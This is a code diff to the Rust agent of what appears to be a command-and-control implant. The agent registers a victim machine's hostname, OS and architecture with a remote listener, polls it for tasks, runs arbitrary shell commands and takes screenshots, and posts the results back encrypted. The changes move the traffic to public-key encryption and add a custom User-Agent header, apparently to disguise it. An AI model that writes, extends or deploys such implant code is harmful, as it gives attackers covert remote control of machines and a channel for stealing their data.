@@ -1,4 +1,6 @@
+use reqwest::header::{HeaderMap, USER_AGENT};
 use std::{
+    collections::HashMap,
     io::{self, Write},
     thread,
     time,
@@ -6,13 +8,15 @@ use std::{
 };
 
 use crate::{
-    core::agents::{AgentData, enc_agentdata},
-    Config,
-    core::tasks::{
-        linux::shell::shell,
-        screenshot::screenshot
+    core::{
+        postdata::{CipherData, PlainData, RegisterAgentData},
+        tasks::{
+            linux::shell::shell,
+            screenshot::screenshot
+        }
     },
-    crypto::aesgcm::{decode_decrypt, encrypt_encode},
+    Config,
+    crypto::aesgcm::{cipher, decipher, EncMessage},
     utils::random::random_name, config::listener,
 };
 
@@ -36,19 +40,21 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         config.listener.port.to_owned(),
     );
 
-    let mut ra = AgentData::new(
-        agent_name,
+    let rad = RegisterAgentData::new(
+        agent_name.to_string(),
         hostname,
         os,
         arch,
         listener_url.to_string(),
-        config.key.to_string(),
-        config.nonce.to_string(),
+        config.my_public_key,
     );
-    let ra_enc = enc_agentdata(ra.clone());
 
     // Initialize client
     let mut client = reqwest::Client::new();
+
+    // Prepare HTTP request headers
+    let mut headers = HeaderMap::new();
+    headers.insert(USER_AGENT, config.listener.user_agent.parse().unwrap());
 
     // Agent registration process
     let mut registered = false;
@@ -58,25 +64,21 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         // Register agent
         let response = match client
             .post(format!("{}{}", listener_url.to_string(), "r"))
-            .json(&ra_enc)
+            .headers(headers.clone())
+            .json(&rad)
             .send()
             .await
         {
             Ok(resp) => {
                 registered = true;
-                let resp = resp.text().await.unwrap();
-              
-                String::from_utf8(
-                    decode_decrypt(
-                        resp.as_bytes(),
-                        config.key.as_bytes(),
-                        config.nonce.as_bytes()
-                    )).unwrap()
+                resp.text().await.unwrap()
             },
             Err(_) => continue,
         };
         // println!("{}", response);
     }
+
+    let plaindata = PlainData::new(agent_name.to_string());
 
     loop {
         // TODO: Implement graceful shutdown
@@ -86,22 +88,26 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         // Get task
         let task = match client
             .post(format!("{}{}", listener_url.to_string(), "t/a"))
-            .json(&ra_enc)
+            .headers(headers.clone())
+            .json(&plaindata)
             .send()
             .await
         {
             Ok(resp) => {
                 let resp = resp.text().await.unwrap();
+                if resp == "" {
+                    continue;
+                }
 
-                String::from_utf8(
-                    decode_decrypt(
-                        resp.as_bytes(),
-                        config.key.as_bytes(),
-                        config.nonce.as_bytes()
-                    )).unwrap()
+                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
+                let deciphered_task = decipher(
+                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                );
+                String::from_utf8(deciphered_task).unwrap()
             },
             Err(e) => {
-                // println!("Error fetching /t/a: {:?}", e);
                 continue;
             }
         };
@@ -122,34 +128,70 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
             "screenshot" => {
                 match screenshot().await {
                     Ok(result) => {
-                        ra.task_result = Some(result);
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            &result,
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+
+                        client
+                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                            .headers(headers.clone())
+                            .json(&cipherdata)
+                            .send()
+                            .await;
                     }
                     Err(e) => {
-                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            e.to_string().as_bytes(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+
+                        client
+                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                            .headers(headers.clone())
+                            .json(&cipherdata)
+                            .send()
+                            .await;
                     }
                 }
-                let ra_enc = enc_agentdata(ra.clone());
-                client
-                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                    .json(&ra_enc)
-                    .send()
-                    .await;
             }
             "shell" => {
                 match shell(task_args[1..].join(" ").to_string()).await {
                     Ok(result) => {
-                        ra.task_result = Some(result);
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            &result,
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+
+                        client
+                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                            .headers(headers.clone())
+                            .json(&cipherdata)
+                            .send()
+                            .await;
                     }
                     Err(e) => {
-                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                        let cipherdata = CipherData::new(
+                            agent_name.to_string(),
+                            e.to_string().as_bytes(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        );
+
+                        client
+                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                            .headers(headers.clone())
+                            .json(&cipherdata)
+                            .send()
+                            .await;
                     }
                 }
-                let ra_enc = enc_agentdata(ra.clone());
-                client
-                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
-                    .json(&ra_enc)
-                    .send()
-                    .await;
             }
             _ => {
                 continue;
